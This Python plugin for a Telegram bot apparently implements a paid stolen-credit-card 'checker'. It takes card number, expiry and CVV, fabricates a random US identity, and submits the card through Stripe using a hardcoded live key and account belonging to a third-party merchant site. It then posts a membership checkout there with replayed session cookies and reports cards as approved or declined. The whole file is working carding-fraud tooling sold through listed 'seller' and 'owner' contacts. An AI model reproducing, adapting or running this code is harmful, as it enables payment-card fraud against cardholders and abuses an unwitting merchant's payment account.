from configss._def_main_ import *


@Client.on_message(filters.command(["yr"], ["/", "."]))
async def yr(_, message: Message):
    
    with open(file='plugins/rangos/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x:

            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b> 𝙐𝙨𝙚 <code>/yr card</code></b>")
                return

            ccs  = data[1]
            card = re.split(r'[|:]', ccs)
            tiempoinicio = time.perf_counter()
            cc   = card[0]
            mes  = card[1]
            if not mes:
                await message.reply_text("<b> 𝙐𝙨𝙚 <code>/yr card</code></b>")
                return
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]
            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{cc}").json()          
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            req = requests.get(f"https://lookup.binlist.net/{cc}").json()
            
            scheme = req["scheme"]
            res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
            random_data = json.loads(res.text)
            phone_number = "225"+ "-" + str(random.randint(111,999))+ "-" +str(random.randint(0000,9999))
            first_name = random_data['results'][0]['name']['first']
            last_name = random_data['results'][0]['name']['last']
            street = str(random_data['results'][0]['location']['street']['number']) +" " +random_data['results'][0]['location']['street']['name']
            city = random_data['results'][0]['location']['city']
            state = random_data['results'][0]['location']['state']
            zip = random_data['results'][0]['location']['postcode']
            email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))) + '@gmail.com'
            username = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
            password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))      
            tiempofinal = time.perf_counter()
            rank = get_user_rank(message.from_user.id)
            msg=await message.reply(f"""<b><code>{cc}|{mes}|{ano}|{cvv}</code> 


┣ • 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝘾𝙝𝙚𝙠𝙚𝙖𝙣𝙙𝙤 🔴 1.0(s)
┣ • 𝘽𝙄𝙉 : <code>{BIN}</code>
┣ • 𝘿𝘼𝙏𝘼 : <code>{brand}  {typea}  {level}</code>
┣ • 𝘽𝘼𝙉𝙆 : {bank}
┣ • 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 : <code>{country_name} [{country_flag}] </code>
┣━━━━━━━━━━━━━━━━━━━━
┣ • 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮:  <code>@{message.from_user.username}</code>  [{rank}]</b>""")

            headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; RMX2163) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
}


            data = 'type=card&card[number]='+cc+'&card[cvc]='+cvv+'&card[exp_month]='+mes+'&card[exp_year]='+ano+'&guid=82ab7260-fe8b-42ae-b243-6c3bb9ae6f6aeb0168&muid=69f58056-574c-481a-8440-62a412520799541d0d&sid=f80c1f75-d153-4666-af49-831ba877a15935286c&payment_user_agent=stripe.js%2F7a2397b1dd%3B+stripe-js-v3%2F7a2397b1dd&time_on_page=51105&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1GVWtSAsnQpRziaF'
            response1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
            json_first = json.loads(response1.text)
            if 'error' in json_first:
                text = f"""<b>↳ «𝙶𝚊𝚝𝚎𝚠𝚊𝚢 𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌

┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Decline [❌️]</code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code>
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code>
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: code><i>{tiempofinal - tiempoinicio:0.2}</i></code>
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>
┣ • 𝘽𝙤𝙩 𝙗𝙮: @THE_ORGULLOT
┗━━━━━━━━━━━━━━━━━━━━"""
                await msg.edit_text(text)
            elif 'id' not in json_first:
                text = f"""<b>↳ «𝙶𝚊𝚝𝚎𝚠𝚊𝚢 𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌

┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Decline [❌️]</code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code>
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code>
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: code><i>{tiempofinal - tiempoinicio:0.2}</i></code>
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>
┣ • 𝘽𝙤𝙩 𝙗𝙮: @THE_ORGULLOT
┗━━━━━━━━━━━━━━━━━━━━"""
                await msg.edit_text(text)
            else:
                idw = json_first["id"]

                msg1=await msg.edit(f"""<b><code>{cc}|{mes}|{ano}|{cvv}</code> 


┣ • 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝘾𝙝𝙚𝙠𝙚𝙖𝙣𝙙𝙤 🟠 4.40(s)
┣ • 𝘽𝙄𝙉 : <code>{BIN}</code>
┣ • 𝘿𝘼𝙏𝘼 : <code>{brand}  {typea}  {level}</code>
┣ • 𝘽𝘼𝙉𝙆 : {bank}
┣ • 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 : <code>{country_name} [{country_flag}] </code>
┣━━━━━━━━━━━━━━━━━━━━
┣ • 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮:  <code>@{message.from_user.username}</code>  [{rank}]</b>""")


                cookies = {
    '__stripe_mid': '69f58056-574c-481a-8440-62a412520799541d0d',
    'PHPSESSID': 'dca2b72638bcd5de989f3e6c25d19c27',
    'pmpro_visit': '1',
    '__stripe_sid': 'f80c1f75-d153-4666-af49-831ba877a15935286c',
    'hustle-hide-module-2': '2',
}

                headers = {
    'authority': 'growthrx.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '__stripe_mid=69f58056-574c-481a-8440-62a412520799541d0d; PHPSESSID=dca2b72638bcd5de989f3e6c25d19c27; pmpro_visit=1; __stripe_sid=f80c1f75-d153-4666-af49-831ba877a15935286c; hustle-hide-module-2=2',
    'origin': 'https://growthrx.com',
    'referer': 'https://growthrx.com/membership-account/membership-checkout/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; RMX2163) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
}

                data = {
    'level': '1',
    'checkjavascript': '1',
    'other_discount_code': '',
    'username': username,
    'password': password,
    'password2': password,
    'bemail': email,
    'bconfirmemail': email,
    'fullname': '',
    'CardType': scheme,
    'discount_code': '',
    'submit-checkout': '1',
    'javascriptok': '1',
    'payment_method_id': idw,
    'AccountNumber': cc,
    'ExpirationMonth': mes,
    'ExpirationYear': ano,
}
                
                response2 = requests.post(
    'https://growthrx.com/membership-account/membership-checkout/',
    cookies=cookies,
    headers=headers,
    data=data,
)
                
                
                
                
                msg2=await msg1.edit(f"""<b><code>{cc}|{mes}|{ano}|{cvv}</code> 


┣ • 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝘾𝙝𝙚𝙠𝙚𝙖𝙣𝙙𝙤 🟢 6.20(s)
┣ • 𝘽𝙄𝙉 : <code>{BIN}</code>
┣ • 𝘿𝘼𝙏𝘼 : <code>{brand}  {typea}  {level}</code>
┣ • 𝘽𝘼𝙉𝙆 : {bank}
┣ • 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 : <code>{country_name} [{country_flag}] </code>
┣━━━━━━━━━━━━━━━━━━━━
┣ • 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮:  <code>@{message.from_user.username}</code>  [{rank}]</b>""")

                
                if 'Your card was declined.' in response2.text:
                    await msg2.edit(f"""<b>↳ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌

┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Decline [❌️]</code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code>
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code>
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: code><i>{tiempofinal - tiempoinicio:0.2}</i></code>
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>
┣ • 𝘽𝙤𝙩 𝙗𝙮: @THE_ORGULLOT
┗━━━━━━━━━━━━━━━━━━━━""")
                    
                elif"Your card's security code is incorrect." in response2.text:
                    await msg2.edit(f"""<b>↳ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌

┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Decline [❌️]</code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code>
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code>
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: code><i>{tiempofinal - tiempoinicio:0.2}</i></code>
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>
┣ • 𝘽𝙤𝙩 𝙗𝙮: @THE_ORGULLOT
┗━━━━━━━━━━━━━━━━━━━━""")
                elif 'Your card has insufficient funds.' in response2.text:
                    await msg2.edit(f"""<b>↳ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌

┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Decline [❌️]</code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code>
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code>
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: code><i>{tiempofinal - tiempoinicio:0.2}</i></code>
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>
┣ • 𝘽𝙤𝙩 𝙗𝙮: @THE_ORGULLOT
┗━━━━━━━━━━━━━━━━━━━━""")

                elif 'Your card number is incorrect.' in response2.text:
                    await msg2.edit(f"""<b>↳  
𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌

┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Decline [❌️]</code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code>
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code>
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: code><i>{tiempofinal - tiempoinicio:0.2}</i></code>
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>
┣ • 𝘽𝙤𝙩 𝙗𝙮: @THE_ORGULLOT
┗━━━━━━━━━━━━━━━━━━━━""")
                elif 'succeed' in response2.text:
                    await msg2.edit(f"""
<b>↳ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅

┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>APPROVED [✅]</code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code>
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code>
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: code><i>{tiempofinal - tiempoinicio:0.2}</i></code>
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>
┣ • 𝘽𝙤𝙩 𝙗𝙮: @THE_ORGULLOT
┗━━━━━━━━━━━━━━━━━━━━""")
        
      
        else:
            return await message.reply(f'<b>𝘾𝙝𝙖𝙩 𝙣𝙤 𝙖𝙪𝙩𝙤𝙧𝙞𝙯𝙖𝙙𝙤 𝙊 𝙉𝙤 𝙀𝙧𝙚𝙨 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙚 𝘾𝙤𝙣 𝙡𝙤𝙨 𝙎𝙚𝙡𝙡𝙚𝙧 𝙤 𝙊𝙬𝙣𝙚𝙧</b>',
reply_markup=InlineKeyboardMarkup(
        [
            [
        
                InlineKeyboardButton("𝙎𝙀𝙇𝙇𝙀𝙍", url="t.me/CAMILO10B"),
                InlineKeyboardButton("𝙎𝙀𝙇𝙇𝙀𝙍", url="t.me/VIP_KEVINHO_JR"),
               InlineKeyboardButton("𝙎𝙀𝙇𝙇𝙀𝙍", url="t.me/Tamarindo2K"),
                  
                InlineKeyboardButton("𝙊𝙒𝙉𝙀𝙍", url="t.me/THE_ORGULLOT"),

                InlineKeyboardButton("𝙊𝙒𝙉𝙀𝙍", url="t.me/Swnfloxs"),
                
            ]
            
        ]

    )
    
 )        